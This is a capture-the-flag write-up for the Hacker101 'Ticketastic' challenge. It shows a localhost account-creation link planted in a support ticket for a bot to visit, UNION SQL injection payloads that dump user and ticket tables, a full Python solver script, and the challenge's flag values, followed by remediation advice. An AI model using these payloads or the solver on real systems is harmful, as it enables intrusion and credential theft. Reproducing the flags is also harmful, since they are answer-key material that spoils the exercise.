---
description: >-
  Hacker101 Ticketastic Live Instance writeup covering support-bot localhost
  abuse, account creation, UNION SQL injection, ticket database dumping, and
  valid flag extraction.
---

# Ticketastic Live Instance - Hacker101 CTF Writeup

## Hacker101 CTF - Ticketastic Live Instance

### Overview

This machine is called **Ticketastic Live Instance**.

My instance URL was:

```
https://126fc2044e3ed1a80811077b122d8919.ctf.hacker101.com/
```

The website is a support ticket system.

The homepage shows two main links:

```
Submit a Ticket
Admin Login
```

At first, it looks like a basic helpdesk application where users can submit tickets and admins can reply to them.

The challenge has **two valid flags**.

During the solve, I also found one extra value that looked like a flag, but it was not accepted by the platform. The ticket itself said that flag was rejected, and the admin reply contained the real flag.

The final valid flags were:

```
^FLAG^4a5a56ff810a0580894ca0983402a4e6283ce003825b562210a3a42d255c5aa3$FLAG$
^FLAG^2451b1359df1813722df621445592161800769316dfa176c691ba476e8c98ba6$FLAG$
```

The main vulnerabilities were:

```
1. The support bot visits links submitted in tickets.
2. The bot can access localhost from inside the server.
3. /newUser can be abused through localhost to create an account.
4. /ticket?id= is vulnerable to UNION SQL injection.
5. The ticket database contains one real flag in a reply.
6. The users table stores the admin password as a flag.
```

***

### Initial Recon

I started by opening the homepage:

```bash
curl -i https://126fc2044e3ed1a80811077b122d8919.ctf.hacker101.com/
```

The page returned:

```html
<!doctype html>
<html>
	<head>
		<title>Ticketastic Deluxe - Home</title>
	</head>
	<body>
		<h1>Welcome to Ticketastic</h1>
		<p><a href="newTicket">Submit a Ticket</a> | <a href="login">Admin Login</a></p>
		<h2>Support Home</h2>
		<p>If you're having problems with your installation of Ticketastic or the demo instance, please submit a ticket.</p>
	</body>
</html>
```

The two interesting endpoints were:

```
/newTicket
/login
```

So I checked the ticket submission form:

```bash
curl -i https://126fc2044e3ed1a80811077b122d8919.ctf.hacker101.com/newTicket
```

The form fields were:

```
title
body
```

That means I can submit a ticket with a title and a body.

Since this is a support system, it is very likely that someone or something reads submitted tickets.

That made links inside ticket bodies interesting.

***

### Checking Admin Login

The application had an admin login page:

```
/login
```

I tested the obvious credentials:

```
admin:admin
```

On this live instance, `admin/admin` did not give the real solving path.

The useful approach was not to rely on admin credentials directly.

Instead, the goal was to make the internal ticket reader create a user for me.

***

### The Main Idea

The homepage says this is a support system.

If users submit tickets, support staff or a support bot may open them.

If the bot opens links from tickets, then we can make the bot request internal URLs.

The important internal endpoint is:

```
http://localhost/newUser
```

From outside, we can access:

```
/newUser
```

But the real trick is to make the server-side bot visit:

```
http://localhost/newUser?username=...&password=...&password2=...
```

If the bot visits that URL from inside the server, it creates a user account for us.

So the attack is:

```
1. Submit a ticket containing a localhost /newUser link.
2. Wait for the ticket reader/bot to visit it.
3. Log in using the username and password from the link.
4. Access ticket pages as an authenticated user.
5. Exploit SQL injection in /ticket?id=.
6. Dump the flags.
```

***

### Creating a User Through the Bot

I generated a random username and password:

```
username = regaan_lw1bntc
password = Pass_hjyq51h4x1s8
```

Then I created this internal localhost link:

```
http://localhost/newUser?username=regaan_lw1bntc&password=Pass_hjyq51h4x1s8&password2=Pass_hjyq51h4x1s8
```

I submitted it inside a support ticket body:

```html
Hello support,

I cannot access my account. Please check this internal debug link:

<a href="http://localhost/newUser?username=regaan_lw1bntc&password=Pass_hjyq51h4x1s8&password2=Pass_hjyq51h4x1s8">debug link</a>

Thanks.
```

The request was sent to:

```
/newTicket
```

with fields:

```
title=Login problem
body=<a href="http://localhost/newUser?...">debug link</a>
```

The ticket submission was accepted.

After that, I waited for the bot to visit the link.

When I tried logging in with my generated credentials, it worked:

```
Username: regaan_lw1bntc
Password: Pass_hjyq51h4x1s8
```

So the bot had visited the localhost link and created my user.

***

### Authenticated Access

After logging in as the bot-created user, I checked the available pages.

Important pages were:

```
/admin
/ticket?id=1
/ticket?id=2
/newTicket
/newUser
```

The ticket page was especially interesting:

```
/ticket?id=1
```

When I opened ticket ID 1, I saw flag-looking values.

The ticket body contained this:

```
I got the flag ^FLAG^473121a84f678d3780e80d8a714757768ec447311b95c8e148b286caa1ffc971$FLAG$ but the site rejects it. Any thoughts?
```

This looks like a flag, but the ticket clearly says the site rejects it.

So this is a fake / invalid flag.

The reply contained:

```
Yeah, the correct flag is ^FLAG^4a5a56ff810a0580894ca0983402a4e6283ce003825b562210a3a42d255c5aa3$FLAG$. Let me know if you have any problems!
```

So the real first valid flag was:

```
^FLAG^4a5a56ff810a0580894ca0983402a4e6283ce003825b562210a3a42d255c5aa3$FLAG$
```

***

### Important Note About the Fake Flag

The script initially extracted three flag-looking strings because all of them matched the same regex pattern.

But one of them was invalid:

```
^FLAG^473121a84f678d3780e80d8a714757768ec447311b95c8e148b286caa1ffc971$FLAG$
```

The reason I ignored it is because the ticket text itself says:

```
I got the flag ... but the site rejects it.
```

The reply says:

```
Yeah, the correct flag is ...
```

So the real flag is the one in the reply:

```
^FLAG^4a5a56ff810a0580894ca0983402a4e6283ce003825b562210a3a42d255c5aa3$FLAG$
```

This machine has only two valid flags.

The fake rejected one should not be counted.

***

### SQL Injection Discovery

After logging in, I tested the ticket endpoint:

```
/ticket?id=1
```

The `id` parameter looked injectable.

I tested a UNION payload:

```sql
1.1 UNION SELECT 1,2,3-- 
```

Full request:

```
/ticket?id=1.1 UNION SELECT 1,2,3-- 
```

The response showed:

```html
<h1>1</h1>
<pre>2</pre>
<h2>Our Reply</h2>
<pre>3</pre>
```

That confirmed a 3-column UNION SQL injection.

The ticket page renders three values:

```
title
body
reply
```

So this SQL injection gives control over all three displayed fields.

***

### Database Enumeration

Next, I checked the database version and database name:

```sql
1.1 UNION SELECT VERSION(),DATABASE(),3-- 
```

The response showed:

```
10.1.37-MariaDB-0+deb9u1
level7
```

So the database name was:

```
level7
```

Then I enumerated tables:

```sql
1.1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_SCHEMA=DATABASE()-- 
```

The response showed:

```
tickets,users
```

So the useful tables were:

```
tickets
users
```

Then I checked the columns in the `users` table:

```sql
1.1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3
FROM INFORMATION_SCHEMA.COLUMNS
WHERE TABLE_SCHEMA=DATABASE()
AND TABLE_NAME='users'-- 
```

The response showed:

```
id,username,password
```

So the `users` table had:

```
id
username
password
```

***

### Dumping the Users Table

I dumped usernames and passwords:

```sql
1.1 UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),3
FROM users-- 
```

The response showed:

```
admin:^FLAG^2451b1359df1813722df621445592161800769316dfa176c691ba476e8c98ba6$FLAG$
regaan_lw1bntc:Pass_hjyq51h4x1s8
```

So the admin password was actually the second valid flag:

```
^FLAG^2451b1359df1813722df621445592161800769316dfa176c691ba476e8c98ba6$FLAG$
```

I also confirmed it directly with:

```sql
1.1 UNION SELECT 1,password,3
FROM users
WHERE username='admin'-- 
```

The response showed:

```
^FLAG^2451b1359df1813722df621445592161800769316dfa176c691ba476e8c98ba6$FLAG$
```

So the second valid flag was recovered from the admin password field.

***

### Dumping the Tickets Table

I also dumped the tickets table.

First, I dumped ticket IDs, titles, and bodies:

```sql
1.1 UNION SELECT 1,GROUP_CONCAT(id,':',title,':',body SEPARATOR '<br>'),3
FROM tickets-- 
```

This showed:

```
1:Flag Won't Work:I got the flag ^FLAG^473121a84f678d3780e80d8a714757768ec447311b95c8e148b286caa1ffc971$FLAG$ but the site rejects it. Any thoughts?

2:Login problem:Hello support,

I cannot access my account. Please check this internal debug link:

<a href="http://localhost/newUser?username=regaan_lw1bntc&password=Pass_hjyq51h4x1s8&password2=Pass_hjyq51h4x1s8">debug link</a>

Thanks.
```

Then I dumped ticket replies too:

```sql
1.1 UNION SELECT 1,GROUP_CONCAT(id,':',title,':',body,':',reply SEPARATOR '<br>'),3
FROM tickets-- 
```

This showed:

```
1:Flag Won't Work:
I got the flag ^FLAG^473121a84f678d3780e80d8a714757768ec447311b95c8e148b286caa1ffc971$FLAG$ but the site rejects it. Any thoughts?:
Yeah, the correct flag is ^FLAG^4a5a56ff810a0580894ca0983402a4e6283ce003825b562210a3a42d255c5aa3$FLAG$. Let me know if you have any problems!
```

That confirmed again:

```
Rejected fake flag:
^FLAG^473121a84f678d3780e80d8a714757768ec447311b95c8e148b286caa1ffc971$FLAG$

Correct valid flag:
^FLAG^4a5a56ff810a0580894ca0983402a4e6283ce003825b562210a3a42d255c5aa3$FLAG$
```

***

### Full Solver Script

This is the final solver script.

It does the full solve automatically:

```
1. Opens the homepage.
2. Submits a ticket containing a localhost /newUser link.
3. Waits for the bot to create the user.
4. Logs in as the bot-created user.
5. Checks authenticated ticket pages.
6. Runs UNION SQL injection on /ticket?id=.
7. Extracts valid flags.
8. Filters out the fake rejected flag.
```

```python
#!/usr/bin/env python3
import argparse
import random
import re
import string
import sys
import time
from urllib.parse import urljoin, urlparse

import requests


DEFAULT_URL = "https://126fc2044e3ed1a80811077b122d8919.ctf.hacker101.com/"

INVALID_FLAGS = {
    "^FLAG^473121a84f678d3780e80d8a714757768ec447311b95c8e148b286caa1ffc971$FLAG$",
}


def normalize_url(url):
    url = url.strip()

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    if not url.endswith("/"):
        url += "/"

    return url


def rand_string(n=8):
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(n))


def extract_flags(text):
    flags = re.findall(r"\^FLAG\^[A-Za-z0-9]+\$FLAG\$", text)
    flags = [flag for flag in flags if flag not in INVALID_FLAGS]
    return list(dict.fromkeys(flags))


def extract_all_flag_like_values(text):
    flags = re.findall(r"\^FLAG\^[A-Za-z0-9]+\$FLAG\$", text)
    return list(dict.fromkeys(flags))


def get(session, url, **kwargs):
    return session.get(url, timeout=25, allow_redirects=True, **kwargs)


def post(session, url, data, **kwargs):
    return session.post(url, data=data, timeout=25, allow_redirects=True, **kwargs)


def print_flags(label, flags):
    print(f"\n[{label}]")

    if not flags:
        print("[-] No valid flags found")
        return

    for flag in flags:
        print(f"[+] {flag}")


def get_home(base_url):
    session = requests.Session()
    r = get(session, base_url)

    print(f"[+] Homepage status: {r.status_code}")
    print("[+] Homepage preview:")
    print(r.text[:1000])

    return r.text


def parse_form_fields(html):
    names = re.findall(r'name=["\']([^"\']+)["\']', html, flags=re.I)
    return list(dict.fromkeys(names))


def submit_ticket(base_url, title, body):
    session = requests.Session()

    new_ticket_url = urljoin(base_url, "newTicket")

    print(f"\n[+] Opening ticket form: {new_ticket_url}")

    try:
        form = get(session, new_ticket_url)
        print(f"[+] newTicket status: {form.status_code}")
        fields = parse_form_fields(form.text)
        print(f"[+] Form field names found: {fields}")
    except Exception as e:
        print(f"[-] Could not open form: {e}")
        fields = []

    variants = [
        {"title": title, "body": body},
        {"subject": title, "body": body},
        {"title": title, "content": body},
        {"name": title, "body": body},
    ]

    useful = [field for field in fields if field.lower() not in {"csrf", "submit"}]

    if len(useful) >= 2:
        variants.insert(0, {useful[0]: title, useful[1]: body})

    last = None

    for data in variants:
        print(f"[+] Submitting ticket with fields: {list(data.keys())}")

        try:
            r = post(session, new_ticket_url, data=data)
            last = r
        except Exception as e:
            print(f"[-] Submit failed: {e}")
            continue

        print(f"[+] Status: {r.status_code}")

        low = r.text.lower()

        if (
            "thanks" in low
            or "ticket" in low
            or "submission" in low
            or r.status_code in (200, 302)
        ):
            print("[+] Ticket submission probably accepted")
            return r

    return last


def submit_localhost_user_ticket(base_url, username, password):
    localhost_link = (
        "http://localhost/newUser"
        f"?username={username}"
        f"&password={password}"
        f"&password2={password}"
    )

    body = f"""
Hello support,

I cannot access my account. Please check this internal debug link:

<a href="{localhost_link}">debug link</a>

Thanks.
""".strip()

    print("\n[+] Submitting bot ticket")
    print(f"[+] Localhost link: {localhost_link}")

    return submit_ticket(base_url, "Login problem", body)


def try_login(base_url, username, password):
    login_url = urljoin(base_url, "login")
    session = requests.Session()

    variants = [
        {"username": username, "password": password},
        {"user": username, "password": password},
        {"name": username, "password": password},
    ]

    for data in variants:
        try:
            r = post(session, login_url, data=data)
        except Exception as e:
            print(f"[-] Login request failed: {e}")
            continue

        low = r.text.lower()

        bad = any(x in low for x in ["invalid", "incorrect", "wrong", "bad password"])
        good = any(x in low for x in ["logout", "admin", "ticket?id", "newuser", "ticket"])

        print(
            f"[+] Login {username}:{password} using {list(data.keys())} "
            f"status={r.status_code} good={good} bad={bad}"
        )

        if good and not bad:
            return session, r

    return None, None


def wait_for_user(base_url, username, password, wait_seconds):
    print("\n[+] Waiting for the ticket reader/bot to create our user")
    print(f"[+] Username: {username}")
    print(f"[+] Password: {password}")

    end = time.time() + wait_seconds

    while time.time() < end:
        session, response = try_login(base_url, username, password)

        if session:
            print("[+] Bot-created user login worked")
            return session, response

        left = int(end - time.time())
        print(f"[-] Not ready yet. Sleeping 10s. Remaining: {left}s")
        time.sleep(10)

    return None, None


def check_authenticated_pages(session, base_url):
    paths = [
        "",
        "admin",
        "ticket?id=1",
        "ticket?id=2",
        "newTicket",
        "newUser",
    ]

    combined = ""

    print("\n[+] Checking authenticated pages")

    for path in paths:
        url = urljoin(base_url, path)

        try:
            r = get(session, url)
        except Exception as e:
            print(f"[-] GET {url} failed: {e}")
            continue

        print(f"[+] GET {url} -> {r.status_code}, len={len(r.text)}")

        combined += "\n" + r.text

        flags = extract_flags(r.text)

        if flags:
            print(f"[+] Valid flags on {url}:")
            for flag in flags:
                print(f"    {flag}")

        all_flag_like = extract_all_flag_like_values(r.text)
        rejected = [flag for flag in all_flag_like if flag in INVALID_FLAGS]

        if rejected:
            print(f"[!] Ignoring rejected fake flag on {url}:")
            for flag in rejected:
                print(f"    {flag}")

    return combined


def check_ticket_ids(session, base_url, max_id):
    print("\n[+] Checking ticket IDs")

    combined = ""

    for i in range(1, max_id + 1):
        url = urljoin(base_url, f"ticket?id={i}")

        try:
            r = get(session, url)
        except Exception as e:
            print(f"[-] ticket id={i} failed: {e}")
            continue

        combined += "\n" + r.text

        flags = extract_flags(r.text)

        if flags:
            print(f"[+] Valid flags found in ticket id={i}")
            for flag in flags:
                print(f"    {flag}")

        rejected = [
            flag
            for flag in extract_all_flag_like_values(r.text)
            if flag in INVALID_FLAGS
        ]

        if rejected:
            print(f"[!] Ignoring rejected fake flag in ticket id={i}")
            for flag in rejected:
                print(f"    {flag}")

        if i <= 5:
            print(f"[+] ticket id={i} status={r.status_code}, len={len(r.text)}")
            print(r.text[:500])

    return combined


def sqli(session, base_url, payload):
    url = urljoin(base_url, "ticket")

    r = get(session, url, params={"id": payload})

    print("\n[+] SQLi payload:")
    print(payload)
    print(f"[+] Final URL: {r.url}")
    print(f"[+] Status: {r.status_code}")
    print("[+] Preview:")
    print(r.text[:1000])

    return r.text


def run_sqli(session, base_url):
    print("\n[+] Running SQL injection phase")

    payloads = [
        "1.1 UNION SELECT 1,2,3-- ",
        "1.1 UNION SELECT VERSION(),DATABASE(),3-- ",
        "1.1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()-- ",
        "1.1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'-- ",
        "1.1 UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),3 FROM users-- ",
        "1.1 UNION SELECT 1,password,3 FROM users WHERE username='admin'-- ",
        "1.1 UNION SELECT 1,GROUP_CONCAT(id,':',username,':',password SEPARATOR '<br>'),3 FROM users-- ",
        "1.1 UNION SELECT 1,GROUP_CONCAT(id,':',title,':',body SEPARATOR '<br>'),3 FROM tickets-- ",
        "1.1 UNION SELECT 1,GROUP_CONCAT(id,':',title,':',body,':',reply SEPARATOR '<br>'),3 FROM tickets-- ",
    ]

    combined = ""

    for payload in payloads:
        try:
            text = sqli(session, base_url, payload)
            combined += "\n" + text
        except Exception as e:
            print(f"[-] SQLi failed: {e}")

    return combined


def main():
    parser = argparse.ArgumentParser(description="Hacker101 Ticketastic Live Instance solver")
    parser.add_argument("--url", default=DEFAULT_URL, help="Instance URL")
    parser.add_argument("--wait", type=int, default=300, help="Seconds to wait for the bot")
    parser.add_argument("--max-ticket-id", type=int, default=5)

    args = parser.parse_args()

    base_url = args.url.strip()

    if not base_url.startswith("http://") and not base_url.startswith("https://"):
        base_url = "https://" + base_url

    if not base_url.endswith("/"):
        base_url += "/"

    print(f"[+] Target: {base_url}")

    all_text = ""

    home = get_home(base_url)
    all_text += "\n" + home

    username = "regaan_" + rand_string(7)
    password = "Pass_" + rand_string(12)

    submit_localhost_user_ticket(base_url, username, password)

    session, login_response = wait_for_user(
        base_url,
        username,
        password,
        wait_seconds=args.wait,
    )

    if not session:
        print("[-] Could not log in as bot-created user.")
        sys.exit(1)

    all_text += "\n" + login_response.text

    all_text += check_authenticated_pages(session, base_url)
    all_text += check_ticket_ids(session, base_url, args.max_ticket_id)
    all_text += run_sqli(session, base_url)

    valid_flags = extract_flags(all_text)
    rejected_flags = [
        flag
        for flag in extract_all_flag_like_values(all_text)
        if flag in INVALID_FLAGS
    ]

    print("\n==============================")
    print("[+] VALID FLAGS FOUND")
    print("==============================")

    if valid_flags:
        for flag in valid_flags:
            print(flag)
    else:
        print("[-] No valid flags found")

    if rejected_flags:
        print("\n==============================")
        print("[!] REJECTED / FAKE FLAGS IGNORED")
        print("==============================")
        for flag in list(dict.fromkeys(rejected_flags)):
            print(flag)


if __name__ == "__main__":
    main()
```

***

### Running the Solver

I saved the solver as:

```
ticketastic_solver.py
```

Then I ran:

```bash
python3 ticketastic_solver.py --url https://126fc2044e3ed1a80811077b122d8919.ctf.hacker101.com/ --wait 300
```

The important output was:

```
[+] Bot-created user login worked
```

That confirmed the support bot visited the localhost `/newUser` link and created my user.

Then ticket ID 1 showed the rejected fake flag and the correct reply flag:

```
I got the flag ^FLAG^473121a84f678d3780e80d8a714757768ec447311b95c8e148b286caa1ffc971$FLAG$ but the site rejects it.

Yeah, the correct flag is ^FLAG^4a5a56ff810a0580894ca0983402a4e6283ce003825b562210a3a42d255c5aa3$FLAG$.
```

The SQL injection also dumped the admin password:

```
admin:^FLAG^2451b1359df1813722df621445592161800769316dfa176c691ba476e8c98ba6$FLAG$
```

***

### Final Valid Flags

```
^FLAG^4a5a56ff810a0580894ca0983402a4e6283ce003825b562210a3a42d255c5aa3$FLAG$
^FLAG^2451b1359df1813722df621445592161800769316dfa176c691ba476e8c98ba6$FLAG$
```

***

### Rejected Fake Flag

This value appeared in a ticket body, but the ticket itself said it was rejected by the site:

```
^FLAG^473121a84f678d3780e80d8a714757768ec447311b95c8e148b286caa1ffc971$FLAG$
```

So I did not count it as a valid flag.

***

### Why This Worked

The challenge was vulnerable because the support system trusted ticket content too much.

The ticket reader/bot opened links from user-submitted tickets.

That allowed me to send the bot to:

```
http://localhost/newUser?username=...&password=...&password2=...
```

Since the request came from localhost, the app allowed the user creation.

After logging in as that new user, the ticket endpoint exposed a SQL injection:

```
/ticket?id=
```

The injection had three columns:

```sql
1.1 UNION SELECT 1,2,3-- 
```

So I used UNION queries to enumerate the database and dump:

```
tickets
users
```

The `tickets` table contained the correct flag in a reply.

The `users` table contained the admin password, which was the second flag.

***

### Fix

Several things should be fixed.

The support bot should not blindly visit user-submitted links.

If it must visit links, it should block internal addresses like:

```
localhost
127.0.0.1
0.0.0.0
::1
internal service names
private IP ranges
```

The `/newUser` endpoint should not allow sensitive actions just because the request comes from localhost.

User creation should require authentication or a CSRF-protected workflow.

The SQL injection should be fixed with parameterized queries.

Bad pattern:

```python
query = "SELECT title, body, reply FROM tickets WHERE id = %s" % request.args["id"]
```

Good pattern:

```python
cursor.execute(
    "SELECT title, body, reply FROM tickets WHERE id = %s",
    (request.args["id"],)
)
```

Also, passwords should never be stored in plaintext.

The `users` table showed:

```
admin:<flag>
```

In a real application, passwords should be hashed with a strong password hashing algorithm like:

```
Argon2
bcrypt
scrypt
```

***

### Summary

The solve path was:

```
1. Opened the support instance.
2. Found /newTicket and /login.
3. Submitted a ticket containing a localhost /newUser link.
4. Waited for the support bot to visit the link.
5. Logged in as the created user.
6. Opened ticket id=1.
7. Found a fake rejected flag in the ticket body.
8. Found the real first flag in the ticket reply.
9. Tested /ticket?id= for SQL injection.
10. Confirmed 3-column UNION injection.
11. Enumerated database tables and columns.
12. Dumped the users table.
13. Found the admin password, which was the second flag.
```

The two key payloads were:

```html
<a href="http://localhost/newUser?username=regaan_lw1bntc&password=Pass_hjyq51h4x1s8&password2=Pass_hjyq51h4x1s8">debug link</a>
```

and:

```sql
1.1 UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),3 FROM users-- 
```

The first payload abused the support bot and localhost trust.

The second payload dumped the admin password through SQL injection.
